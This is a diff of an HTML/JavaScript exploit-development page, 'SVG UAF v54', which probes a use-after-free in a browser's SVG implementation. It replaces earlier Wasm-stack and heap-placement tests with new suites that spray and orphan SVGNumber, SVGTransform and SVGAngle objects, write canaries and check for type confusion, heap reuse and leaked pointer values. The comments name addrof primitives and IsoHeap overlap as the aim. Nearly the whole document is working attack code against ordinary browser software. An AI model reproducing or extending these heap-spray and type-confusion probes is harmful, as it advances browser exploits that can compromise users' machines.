@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v53 — addrof Probes III</title>
+<title>SVG UAF v54 — IsoHeap Confusion</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v53 — addrof Probes III: ADR7b/ADR10/ADR11/ADR12</h2>
+<h2>SVG UAF v54 — IsoHeap Confusion + Wasm Fix: CONF1/CONF2/CONF3/ADR7c</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR7b')">ADR7b: Wasm Throw</button>
-  <button onclick="runSuite('ADR10')">ADR10: Matrix multiply</button>
-  <button onclick="runSuite('ADR11')">ADR11: structuredClone</button>
-  <button onclick="runSuite('ADR12')">ADR12: Perf/crypto</button>
+  <button onclick="runSuite('CONF1')">CONF1: IsoHeap overlap</button>
+  <button onclick="runSuite('CONF2')">CONF2: appendItem dup</button>
+  <button onclick="runSuite('CONF3')">CONF3: SVGLength/Number cross</button>
+  <button onclick="runSuite('ADR7c')">ADR7c: Wasm fixed</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -74,8 +74,10 @@ function makeSVG(){
 }
 function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
 var _tmp=null;
-function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
-
+function getTmp(){
+  if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}
+  return _tmp;
+}
 var _dv=new DataView(new ArrayBuffer(8));
 function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
 function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
@@ -92,471 +94,498 @@ function getOrphanedMatrix(){
   g.parentNode.removeChild(g);removeSVG(svg);
   return m;
 }
-
-// ─────────────────────────────────────────────────────────────────
-// ADR7b — Wasm throw fixed
-// Correct minimal Wasm module that:
-//   imports env.cb (func () -> ())
-//   exports "run" (func: calls env.cb)
-// Then we throw from env.cb and inspect the stack.
-// Also tests WebAssembly.Exception / WebAssembly.Tag if available.
-// ─────────────────────────────────────────────────────────────────
-function runADR7b(){
-  L('','suite-hdr');L('ADR7b: Wasm throw / stack frame address leak (fixed)');
-  if(typeof WebAssembly==='undefined'){L('ADR7b: WebAssembly unavailable','miss');return;}
-
-  // Build WAT manually:
-  // (module
-  //   (type $t0 (func))
-  //   (import "env" "cb" (func $cb (type $t0)))
-  //   (func $run (export "run") (type $t0) (call $cb))
-  // )
-  // Binary encoding (verified):
-  var bytes=new Uint8Array([
-    0x00,0x61,0x73,0x6d, // \0asm
-    0x01,0x00,0x00,0x00, // version 1
-    // Type section (id=1): 1 type: [] -> []
-    0x01, 0x04,          // section id=1, size=4
-      0x01,              // count=1
-      0x60,0x00,0x00,    // type[0]: func () -> ()
-    // Import section (id=2): 1 import: env.cb :: type[0]
-    0x02, 0x07,          // section id=2, size=7
-      0x01,              // count=1
-      0x03,0x65,0x6e,0x76, // "env"
-      0x02,0x63,0x62,    // "cb"
-      0x00,0x00,         // kind=func, type index=0
-    // Function section (id=3): 1 function of type[0]
-    0x03, 0x02,          // section id=3, size=2
-      0x01,              // count=1
-      0x00,              // type index=0
-    // Export section (id=7): export "run"=func[1]
-    0x07, 0x07,          // section id=7, size=7
-      0x01,              // count=1
-      0x03,0x72,0x75,0x6e, // "run"
-      0x00,0x01,         // kind=func, index=1
-    // Code section (id=10): 1 body
-    0x0a, 0x06,          // section id=10, size=6
-      0x01,              // count=1
-      0x04,              // body size=4
-      0x00,              // local count=0
-      0x10,0x00,         // call func[0] (env.cb)
-      0x0b,              // end
-  ]);
-
-  var stackFromWasm=null;
-  WebAssembly.instantiate(bytes.buffer,{
-    env:{
-      cb:function wasmCallback(){
-        // throw from inside wasm call chain
-        stackFromWasm=new Error('wasm_throw').stack;
-        throw new Error('thrown_from_wasm_cb');
-      }
-    }
-  }).then(function(result){
-    var inst=result.instance;
-    L('ADR7b: instantiated OK, exports='+Object.keys(inst.exports).join(','));
-
-    // Test 1: basic call works
-    try{
-      inst.exports.run();
-    }catch(err){
-      L('ADR7b: [T1] caught: '+err.message);
-      // stack captured INSIDE the wasm callback
-      if(stackFromWasm){
-        L('ADR7b: [T1] stack from inside wasm callback:');
-        L(stackFromWasm.slice(0,800));
-        var hexPats=stackFromWasm.match(/0x[0-9a-fA-F]{6,}/g)||[];
-        L('ADR7b: [T1] hex patterns: '+hexPats.length);
-        for(var i=0;i<hexPats.length;i++) L('ADR7b: ★ '+hexPats[i],'hit');
-        // wasm: frame lines
-        var wasmLines=stackFromWasm.split('\n').filter(function(l){
-          return/wasm/i.test(l)||/@\[/.test(l)||/\[native\]/.test(l);
-        });
-        L('ADR7b: [T1] wasm-related lines: '+wasmLines.length);
-        for(var i=0;i<wasmLines.length;i++) L('ADR7b: wasm-line: '+wasmLines[i]);
-      }
-
-      // stack from the OUTER catch
-      var outerStk=err.stack||'';
-      L('ADR7b: [T1] outer catch stack:');
-      L(outerStk.slice(0,600));
-      var outerHex=outerStk.match(/0x[0-9a-fA-F]{6,}/g)||[];
-      L('ADR7b: [T1] outer hex patterns: '+outerHex.length);
-      for(var i=0;i<outerHex.length;i++) L('ADR7b: ★outer '+outerHex[i],'hit');
-    }
-
-    // Test 2: WebAssembly.Exception (post-MVP)
-    L('ADR7b: [T2] WebAssembly.Tag='+typeof WebAssembly.Tag);
-    L('ADR7b: [T2] WebAssembly.Exception='+typeof WebAssembly.Exception);
-    if(typeof WebAssembly.Tag!=='undefined'){
-      try{
-        var tag=new WebAssembly.Tag({parameters:['i32']});
-        var wasmEx=new WebAssembly.Exception(tag,[0xdeadbeef|0]);
-        L('ADR7b: [T2] created WebAssembly.Exception');
-        L('ADR7b: [T2] getArg(0)='+wasmEx.getArg(tag,0)+' expected='+(0xdeadbeef|0));
-        L('ADR7b: [T2] stack='+((wasmEx.stack||'').slice(0,200)));
-      }catch(ex){L('ADR7b: [T2] Tag/Exception: '+ex.message);}
-    }
-
-    // Test 3: Wasm memory object — does any property look like a ptr?
-    var mem=new WebAssembly.Memory({initial:1,maximum:4});
-    L('ADR7b: [T3] mem props: '+Object.getOwnPropertyNames(mem).join(', '));
-    try{
-      // grow and check if buffer object address bleeds anywhere
-      var oldBuf=mem.buffer;
-      mem.grow(1);
-      var newBuf=mem.buffer;
-      L('ADR7b: [T3] after grow: oldBuf.byteLength='+oldBuf.byteLength+' newBuf.byteLength='+newBuf.byteLength);
-      L('ADR7b: [T3] old buf detached (byteLength===0): '+(oldBuf.byteLength===0));
-    }catch(ex){L('ADR7b: [T3] grow: '+ex.message);}
-
-  }).catch(function(err){
-    L('ADR7b: compile failed: '+err.message,'miss');
-  });
+// build a feColorMatrix + orphan, return refs array
+function sprayOrphanNums(count, startVal, id) {
+  var svg=makeSVG();
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');
+  filt.setAttribute('id',id||('sp'+Math.random()));
+  filt.appendChild(f);svg.appendChild(filt);
+  var bl=f.values.baseVal;bl.clear();
+  var refs=[];
+  for(var i=0;i<count;i++){
+    var n=getTmp().createSVGNumber();
+    n.value=(startVal!==undefined?startVal+i:i);
+    bl.appendItem(n);
+    refs.push(bl.getItem(bl.length-1));
+  }
+  filt.parentNode.removeChild(filt);
+  removeSVG(svg);
+  return refs;
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR10 — SVGMatrix.multiply() with orphaned matrix argument
-// multiply(m) reads m's a/b/c/d/e/f fields.
-// If we pass an orphaned matrix as the argument, JSC has to call
-// into the C++ SVGMatrix getter on a disconnected object.
-// The multiply result is a NEW SVGMatrix — does its C++ object
-// land at a predictable IsoHeap address?
+// CONF1 — IsoHeap size-class overlap probe
 //
-// Key question: can we use MULTIPLY to get the C++ `this` ptr
-// of the result matrix to reflect back via inverse()?
+// IsoHeap allocates objects by C++ type into per-type pages.
+// SVGNumber   → sizeof = 16 bytes  (vtable ptr 8 + float 4 + pad 4)
+// SVGTransform→ sizeof = 48 bytes  (contains an AffineTransform = 6×f64)
 //
-// Also: DOMMatrix.multiply() — same test but with JS-native object
+// They are in DIFFERENT IsoHeap buckets. BUT:
+// The IsoHeap page directory for SVGNumber at offset N might be
+// adjacent in virtual memory to SVGTransform's page directory.
+//
+// If we can get a SVGTransform C++ object to land immediately AFTER
+// a run of SVGNumbers in the same memory page (not possible in
+// strict IsoHeap)... OR if both type's IsoHeap allocators share
+// the same underlying PageBlock allocator and their pages are
+// interleaved, then reading an SVGMatrix field might expose the
+// bump-pointer from the SVGNumber IsoHeap page header.
+//
+// Approach: spray N SVGNumbers with value 0, orphan them.
+// Then spray N SVGTransforms (each gives us an SVGMatrix).
+// For each matrix, check if ANY field is nonzero after initialization.
+// Identity matrix should be a=1 b=0 c=0 d=1 e=0 f=0.
+// If any field is nonzero, it inherited bits from SVGNumber region.
 // ─────────────────────────────────────────────────────────────────
-function runADR10(){
-  L('','suite-hdr');L('ADR10: SVGMatrix.multiply() orphaned arg / result ptr probe');
+function runCONF1(){
+  L('','suite-hdr');L('CONF1: IsoHeap size-class overlap — SVGNumber → SVGTransform');
 
-  // Test 1: basic multiply with orphaned matrix
-  var m_orphan=getOrphanedMatrix();
-  m_orphan.a=2;m_orphan.b=0;m_orphan.c=0;m_orphan.d=3;m_orphan.e=10;m_orphan.f=20;
+  // Phase 1: spray 500 SVGNumbers with value 0xdeadbeef (as float)
+  // The float32 bit pattern of 0xdeadbeef stored in SVGNumber.m_value
+  // is 0xcf5e5779 — so the float value would be ~-3.735929e9
+  var CANARY = Math.fround(-3.735929e9); // bit pattern close to 0xdeadbeef as f32
+  L('CONF1: canary float32='+CANARY+' bits='+f64hex(CANARY));
+
+  var numRefs=[];
+  for(var k=0;k<5;k++){
+    var refs=sprayOrphanNums(100, undefined, 'c1n'+k);
+    // write canary to each AFTER orphaning
+    for(var i=0;i<refs.length;i++){
+      refs[i].value=CANARY;
+    }
+    numRefs=numRefs.concat(refs);
+  }
+  L('CONF1: sprayed+orphaned '+numRefs.length+' SVGNumbers with canary');
+
+  // Phase 2: now spray SVGTransforms — alloc fresh C++ objects
+  var matrices=[];
+  for(var k=0;k<20;k++){
+    var svg=makeSVG();
+    var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
+    var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
+    var m=g.transform.baseVal.getItem(0).matrix;
+    // Read matrix fields BEFORE writing — identity should be a=1 b=c=e=f=0 d=1
+    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
+    // Check for non-identity values that we didn't set
+    var dirty=[];
+    if(snap.a!==1) dirty.push('a='+snap.a);
+    if(snap.b!==0) dirty.push('b='+snap.b);
+    if(snap.c!==0) dirty.push('c='+snap.c);
+    if(snap.d!==1) dirty.push('d='+snap.d);
+    if(snap.e!==0) dirty.push('e='+snap.e);
+    if(snap.f!==0) dirty.push('f='+snap.f);
+    if(dirty.length>0){
+      L('CONF1: ★ matrix['+k+'] non-identity fields: '+dirty.join(' '),'hit');
+    }
+    // Also check if any field matches canary (would mean direct type confusion)
+    for(var field in snap){
+      if(Math.fround(snap[field])===CANARY){
+        L('CONF1: ★★ matrix['+k+'].'+field+' === CANARY! TYPE CONFUSION!','hit');
+      }
+    }
+    matrices.push({m:m,snap:snap,dirty:dirty.length>0});
+    // orphan it
+    g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
+  }
+
+  var dirtyCount=matrices.filter(function(x){return x.dirty;}).length;
+  L('CONF1: dirty matrices='+dirtyCount+'/'+matrices.length+(dirtyCount>0?' ★ OVERLAP!':'clean'));
+
+  // Phase 3: Reverse — spray SVGTransforms first, write canary, then SVGNumbers
+  L('CONF1: [Phase 3] reverse order: SVGTransform first → SVGNumber after');
+  var matRefs=[];
+  for(var k=0;k<10;k++){
+    var svg2=makeSVG();
+    var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
+    var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
+    var m2=g2.transform.baseVal.getItem(0).matrix;
+    // Write canary to all float64 fields
+    m2.a=0xdeadbeef;m2.b=0xcafebabe;m2.c=0xfeedface;m2.d=0xbaadf00d;m2.e=0x1b000dead;m2.f=0x1b000cafe;
+    g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
+    matRefs.push(m2);
+  }
+  // Now spray SVGNumbers
+  var numRefs2=sprayOrphanNums(200, 0, 'c1n2');
+  var numHits=0;
+  for(var i=0;i<numRefs2.length;i++){
+    var v=numRefs2[i].value;
+    if(v!==0){
+      numHits++;
+      if(numHits<=5) L('CONF1: [P3] num['+i+']='+v+' bits='+f64hex(v),'hit');
+    }
+  }
+  L('CONF1: [Phase 3] nonzero SVGNumbers='+numHits+'/200'+(numHits>0?' ★ BLEED!':'clean'));
+
+  L('CONF1: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// CONF2 — appendItem duplicate / OOB probe
+//
+// SVGNumberList.appendItem(n) appends one item.
+// What if we appendItem the SAME SVGNumber object multiple times?
+// SVGNumberList stores a WTF::Vector<RefPtr<SVGNumber>>.
+// Each appendItem bumps the vector. If we append the SAME ref
+// 100 times then removeItem(0) 100 times, do the remaining refs
+// show a different value — indicating we wrote past the vector end?
+//
+// Also: what is the maximum list length? Does going OOB on the
+// underlying WTF::Vector expose adjacent heap memory?
+// ─────────────────────────────────────────────────────────────────
+function runCONF2(){
+  L('','suite-hdr');L('CONF2: appendItem duplicate / vector OOB probe');
 
   var svg=makeSVG();
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
-  var m_live=g.transform.baseVal.getItem(0).matrix;
-  m_live.a=1;m_live.b=0;m_live.c=0;m_live.d=1;m_live.e=5;m_live.f=5;
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','conf2a');
+  filt.appendChild(f);svg.appendChild(filt);
+  var bl=f.values.baseVal;bl.clear();
 
+  // Test 1: append same object multiple times
+  var sharedNum=getTmp().createSVGNumber();
+  sharedNum.value=42;
+  var dupCount=0;
   try{
-    var result=m_live.multiply(m_orphan);
-    L('ADR10: [T1] multiply(orphaned): a='+result.a+' b='+result.b+' c='+result.c+' d='+result.d+' e='+result.e+' f='+result.f);
-    L('ADR10: [T1] expected: a=2 b=0 c=0 d=3 e=15 f=25');
-    L('ADR10: [T1] correct='+(result.a===2&&result.d===3&&result.e===15&&result.f===25));
-    // check if result fields are ptr-like
-    var rfields={a:result.a,b:result.b,c:result.c,d:result.d,e:result.e,f:result.f};
-    for(var k in rfields){if(isPointerLike(rfields[k]))L('ADR10: ★ result.'+k+'='+rfields[k]+' PTR-LIKE','hit');}
-  }catch(ex){L('ADR10: [T1] multiply threw: '+ex.message,'miss');}
-
-  // Test 2: orphaned matrix multiply by orphaned matrix
-  var m2=getOrphanedMatrix();
-  m2.a=4;m2.b=0;m2.c=0;m2.d=4;m2.e=0;m2.f=0;
-  try{
-    var r2=m_orphan.multiply(m2);
-    L('ADR10: [T2] orphan.multiply(orphan): a='+r2.a+' b='+r2.b+' e='+r2.e+' f='+r2.f);
-    L('ADR10: [T2] expected: a=8 b=0 e=10 f=20');
-    var r2fields={a:r2.a,b:r2.b,c:r2.c,d:r2.d,e:r2.e,f:r2.f};
-    for(var k in r2fields){if(isPointerLike(r2fields[k]))L('ADR10: ★ r2.'+k+'='+r2fields[k]+' PTR-LIKE','hit');}
-  }catch(ex){L('ADR10: [T2] orphan×orphan threw: '+ex.message,'miss');}
-
-  // Test 3: inverse() of multiply result — does it work? (confirms result is live C++ obj)
-  try{
-    // m_orphan: a=2 d=3 → inv: a=1/2 d=1/3
-    var inv=m_orphan.inverse();
-    L('ADR10: [T3] orphan.inverse(): a='+inv.a+' d='+inv.d);
-    L('ADR10: [T3] expected: a=0.5 d=0.333...');
-    // Now: can we use inverse() on the multiply result to echo back the result's fields?
-    // Set result to scale K, use inverse() to echo K
-    var K=0x1b0001234;
-    m_orphan.a=1/K;m_orphan.b=0;m_orphan.c=0;m_orphan.d=K;m_orphan.e=0;m_orphan.f=0;
-    var inv2=m_orphan.inverse();
-    L('ADR10: [T3] echo K=0x1b0001234: inv.a='+inv2.a+' exact='+(inv2.a===K),'hit');
-  }catch(ex){L('ADR10: [T3] inverse: '+ex.message,'miss');}
-
-  // Test 4: DOMMatrix.multiply — result object address probe
-  var dm1=new DOMMatrix([2,0,0,3,10,20]);
-  var dm2=new DOMMatrix([1,0,0,1,5,5]);
-  try{
-    var dmr=dm2.multiply(dm1);
-    L('ADR10: [T4] DOMMatrix multiply: a='+dmr.a+' d='+dmr.d+' e='+dmr.e+' f='+dmr.f);
-    L('ADR10: [T4] expected: a=2 d=3 e=15 f=25');
-    var dmfields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24'];
-    for(var i=0;i<dmfields.length;i++){
-      var v=dmr[dmfields[i]];
-      if(isPointerLike(v)) L('ADR10: ★ dmr.'+dmfields[i]+'='+v+' PTR-LIKE','hit');
+    for(var i=0;i<20;i++){bl.appendItem(sharedNum);}
+    dupCount=bl.length;
+    L('CONF2: [T1] appended same num 20x → list.length='+dupCount);
+    // Read back each item — do they all point to the same value?
+    var allSame=true;
+    for(var i=0;i<bl.length;i++){
+      if(bl.getItem(i).value!==42) allSame=false;
     }
-  }catch(ex){L('ADR10: [T4] DOMMatrix.multiply: '+ex.message,'miss');}
-
-  // Test 5: spray multiply results — does result matrix reuse freed slots?
-  // Alloc 50 result matrices, check if any field has unexpected value
-  L('ADR10: [T5] spray 50 multiply results...');
-  var results=[];
-  var mBase=getOrphanedMatrix();
-  mBase.a=1;mBase.b=0;mBase.c=0;mBase.d=1;mBase.e=0;mBase.f=0;
-  for(var i=0;i<50;i++){
-    var mArg=getOrphanedMatrix();
-    mArg.a=1;mArg.b=0;mArg.c=0;mArg.d=1;mArg.e=i;mArg.f=i;
-    try{var r=mBase.multiply(mArg);results.push(r);}catch(ex){break;}
-  }
-  L('ADR10: [T5] got '+results.length+' results');
-  var anomalies=0;
-  for(var i=0;i<results.length;i++){
-    var r=results[i];
-    if(r.a!==1||r.b!==0||r.c!==0||r.d!==1||r.e!==i||r.f!==i){
-      anomalies++;
-      if(anomalies<=3) L('ADR10: [T5] anomaly['+i+']: a='+r.a+' e='+r.e+' f='+r.f+' expected e=f='+i,'hit');
+    L('CONF2: [T1] all items value=42: '+allSame);
+    // Change sharedNum, check if ALL list items reflect it
+    sharedNum.value=9999;
+    var allUpdated=true;
+    for(var i=0;i<bl.length;i++){
+      if(bl.getItem(i).value!==9999) allUpdated=false;
     }
-  }
-  L('ADR10: [T5] anomalies='+anomalies+(anomalies>0?' ★ HEAP REUSE!':'clean'));
+    L('CONF2: [T1] after change to 9999, all updated: '+allUpdated);
+    L('CONF2: [T1] '+(allUpdated?'★ Shared Ref — same C++ object in all slots':'Separate copies'));
+  }catch(ex){L('CONF2: [T1] dup append: '+ex.message,'warn');}
 
+  bl.clear();
+
+  // Test 2: large vector growth — append 1000 items
+  // WTF::Vector doubles capacity: 0→1→2→4→8→16...
+  // At each capacity double, the old backing array is freed and a new one allocated
+  // If the freed backing array lands in a useful place...
+  L('CONF2: [T2] large vector growth probe (1000 appends)...');
+  var refs=[];
+  for(var i=0;i<1000;i++){
+    var n=getTmp().createSVGNumber();
+    n.value=i;
+    bl.appendItem(n);
+    refs.push(bl.getItem(bl.length-1));
+  }
+  L('CONF2: [T2] list length after 1000 appends='+bl.length);
+  // Check that all refs still valid
+  var valid=0;
+  for(var i=0;i<refs.length;i++){if(refs[i].value===i)valid++;}
+  L('CONF2: [T2] valid refs='+valid+'/'+refs.length);
+
+  // Now clear the list — frees the WTF::Vector backing array
+  bl.clear();
+  L('CONF2: [T2] after clear, list.length='+bl.length);
+  // The 1000 SVGNumber C++ objects are still alive (JS refs hold them)
+  // BUT the vector backing array is freed. Alloc SVGNumbers now —
+  // do they land in the freed vector memory?
+  var postRefs=sprayOrphanNums(50, 7777, 'c2post');
+  // Check if any original ref changed (they shouldn't, they're in IsoHeap not fastMalloc)
+  var changed=0;
+  for(var i=0;i<Math.min(refs.length,50);i++){
+    if(refs[i].value!==i){changed++;L('CONF2: [T2] ref['+i+'] changed to '+refs[i].value,'hit');}
+  }
+  L('CONF2: [T2] changed refs after clear+spray='+changed+(changed>0?' ★ VECTOR REUSE':'clean'));
+
+  // Test 3: removeItem creates holes — does getItem on removed slot return garbage?
+  bl.clear();
+  for(var i=0;i<10;i++){var n=getTmp().createSVGNumber();n.value=100+i;bl.appendItem(n);}
+  L('CONF2: [T3] list built, length='+bl.length);
+  // Remove middle items
+  bl.removeItem(5);
+  bl.removeItem(4);
+  bl.removeItem(3);
+  L('CONF2: [T3] after 3 removes, length='+bl.length);
+  for(var i=0;i<bl.length;i++){
+    var v=bl.getItem(i).value;
+    L('CONF2: [T3] item['+i+']='+v+(isPointerLike(v)?' ★PTR':''));
+  }
+
+  // Test 4: replaceItem with same object — aliasing
+  bl.clear();
+  var numA=getTmp().createSVGNumber();numA.value=111;
+  var numB=getTmp().createSVGNumber();numB.value=222;
+  bl.appendItem(numA);bl.appendItem(numB);
+  L('CONF2: [T4] initial: [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
+  try{
+    // replaceItem returns the replaced item
+    var replaced=bl.replaceItem(numA,1); // put numA at index 1
+    L('CONF2: [T4] after replaceItem(numA,1): [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
+    L('CONF2: [T4] replaced.value='+replaced.value+' (was numB=222)');
+    L('CONF2: [T4] numA is now in both slots — [0].value='+bl.getItem(0).value+' [1].value='+bl.getItem(1).value);
+    // Change numA, see if both slots reflect it
+    numA.value=555;
+    L('CONF2: [T4] after numA=555: [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
+    L('CONF2: [T4] '+(bl.getItem(0).value===555&&bl.getItem(1).value===555?'★ Both slots share ref':'independent'));
+  }catch(ex){L('CONF2: [T4] replaceItem: '+ex.message,'warn');}
+
+  filt.parentNode.removeChild(filt);
   removeSVG(svg);
-  L('ADR10: done');
+  L('CONF2: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR11 — structuredClone / postMessage / JSON
-// structuredClone deep-copies an object. Internally JSC serializes
-// then deserializes. Does the clone's backing store land adjacent
-// to anything useful?
+// CONF3 — SVGLength / SVGNumber cross-type aliasing
 //
-// Key: structuredClone of an object containing an ArrayBuffer —
-// does the clone's AB backing store ptr appear anywhere?
+// SVGLength and SVGNumber are different C++ types but both use IsoHeap.
+// SVGLength has: m_unitType (uint8), m_value (float), vtable ptr
+// SVGNumber has: m_value (float), vtable ptr
+// If their sizes are the same AND IsoHeap doesn't strictly separate
+// them (unlikely but...) we might get aliasing.
 //
-// Also: postMessage to self via MessageChannel — round-trip
-// serialization. The deserialized ArrayBuffer lands in a new
-// JSC heap slot — can we predict where?
+// Real goal: Determine exact C++ sizeof for SVGLength and SVGNumber
+// by measuring how many IsoHeap bump-pointer steps we can infer.
 //
-// Also: JSON.parse of a large string — where does the result object land?
+// Also: SVGAngle, SVGPreserveAspectRatio — more orphaned primitives
+// to experiment with cross-type confusion.
 // ─────────────────────────────────────────────────────────────────
-function runADR11(){
-  L('','suite-hdr');L('ADR11: structuredClone / postMessage / JSON heap placement');
+function runCONF3(){
+  L('','suite-hdr');L('CONF3: SVGLength/SVGNumber/SVGAngle cross-type aliasing probe');
 
-  // Test 1: structuredClone of ArrayBuffer
-  var ab=new ArrayBuffer(64);
-  var u32=new Uint32Array(ab);
-  u32[0]=0xdeadbeef;u32[1]=0xcafebabe;
+  // Test 1: SVGAngle orphan — confirmed alive?
+  var svg=makeSVG();
+  var marker=document.createElementNS(SVG_NS,'marker');
+  marker.setAttribute('orient','45deg');
+  svg.appendChild(marker);
   try{
-    var ab2=structuredClone(ab);
-    var u32_2=new Uint32Array(ab2);
-    L('ADR11: [T1] structuredClone(AB): byteLength='+ab2.byteLength+' canary=0x'+u32_2[0].toString(16));
-    L('ADR11: [T1] original detached after clone: '+(ab.byteLength===0)+' (should be false for non-transfer)');
-    // Spray SVGNumbers before and after clone, check residue
-    var svg=makeSVG();
-    var f=document.createElementNS(SVG_NS,'feColorMatrix');
-    f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','ac11');
-    filt.appendChild(f);svg.appendChild(filt);
-    var bl=f.values.baseVal;bl.clear();
-    var refs=[];
-    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
-    filt.parentNode.removeChild(filt);
-    // clone a large AB between the spray allocs and the orphan
-    var bigAB=new ArrayBuffer(1024*16);
-    var bigClone=structuredClone(bigAB);
-    var residue=0;
-    for(var i=0;i<refs.length;i++){if(refs[i].value!==0)residue++;}
-    L('ADR11: [T1] post-clone SVGNumber residue='+residue+(residue>0?' ★':'clean'));
+    var angle=marker.orientAngle.baseVal;
+    L('CONF3: [T1] SVGAngle initial: value='+angle.value+' unitType='+angle.unitType);
+    angle.value=90;
+    L('CONF3: [T1] wrote 90: '+angle.value);
+    marker.parentNode.removeChild(marker);
+    L('CONF3: [T1] after marker-remove: value='+angle.value);
     removeSVG(svg);
-  }catch(ex){L('ADR11: [T1] structuredClone: '+ex.message,'warn');}
+    L('CONF3: [T1] after svg-remove: value='+angle.value);
+    L('CONF3: [T1] SVGAngle ALIVE='+(angle.value===90));
+    angle.value=12345;
+    L('CONF3: [T1] write 12345 after full orphan: '+angle.value+' WRITABLE='+(angle.value===12345));
+  }catch(ex){L('CONF3: [T1] SVGAngle: '+ex.message,'warn');}
 
-  // Test 2: MessageChannel postMessage round-trip
-  L('ADR11: [T2] MessageChannel postMessage round-trip...');
-  try{
-    var mc=new MessageChannel();
-    var received=false;
-    mc.port1.onmessage=function(ev){
-      received=true;
-      var data=ev.data;
-      L('ADR11: [T2] received: type='+typeof data+' keys='+Object.keys(data||{}).join(','));
-      if(data&&data.buf instanceof ArrayBuffer){
-        var rv=new Uint32Array(data.buf);
-        L('ADR11: [T2] AB canary: 0x'+rv[0].toString(16)+' byteLength='+data.buf.byteLength);
-        L('ADR11: [T2] transferred (original detached): '+(data.originalDetached===true));
-      }
-      // check for any ptr-like values in received data
-      if(data&&typeof data.val==='number'){
-        L('ADR11: [T2] val='+data.val+' bits='+f64hex(data.val)+' ptr-like='+isPointerLike(data.val));
-      }
-    };
-    // Transfer ArrayBuffer (zero-copy move — exposes backing store)
-    var transferAB=new ArrayBuffer(256);
-    var tview=new Uint32Array(transferAB);
-    tview[0]=0xfeedface;
-    var origLen=transferAB.byteLength;
-    mc.port2.postMessage({buf:transferAB,originalDetached:(transferAB.byteLength===0),val:1/3},[transferAB]);
-    L('ADR11: [T2] sent, AB now detached: '+(transferAB.byteLength===0)+' origLen='+origLen);
-    setTimeout(function(){
-      if(!received) L('ADR11: [T2] no message received (cross-origin blocked?)','warn');
-    },500);
-  }catch(ex){L('ADR11: [T2] MessageChannel: '+ex.message,'warn');}
-
-  // Test 3: JSON.parse heap placement
-  L('ADR11: [T3] JSON.parse heap placement probe...');
-  var jsonStr='['+Array.from({length:100},function(_,i){return i;}).join(',')+']';
-  var arr=JSON.parse(jsonStr);
-  L('ADR11: [T3] JSON.parse array: length='+arr.length+' [0]='+arr[0]+' [99]='+arr[99]);
-  // spray SVGNumbers after JSON.parse, check if any leaked into
+  // Test 2: SVGLength write, then SVGNumber at same IsoHeap offset
+  // Strategy: write a specific float to SVGLength.value, orphan it.
+  // Then spray SVGNumbers. Check if any SVGNumber shows the SVGLength value.
   var svg2=makeSVG();
-  var f2=document.createElementNS(SVG_NS,'feColorMatrix');
-  f2.setAttribute('type','matrix');f2.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','ac11b');
-  filt2.appendChild(f2);svg2.appendChild(filt2);
-  var bl2=f2.values.baseVal;bl2.clear();
-  var refs2=[];
-  for(var i=0;i<20;i++){var n2=getTmp().createSVGNumber();n2.value=0;bl2.appendItem(n2);refs2.push(bl2.getItem(bl2.length-1));}
-  filt2.parentNode.removeChild(filt2);
-  var residue2=0;
-  for(var i=0;i<refs2.length;i++){if(refs2[i].value!==0)residue2++;}
-  L('ADR11: [T3] JSON-adjacent SVGNumber residue='+residue2+(residue2>0?' ★':'clean'));
+  var rect=document.createElementNS(SVG_NS,'rect');
+  rect.setAttribute('x','0');rect.setAttribute('y','0');
+  rect.setAttribute('width','100');rect.setAttribute('height','100');
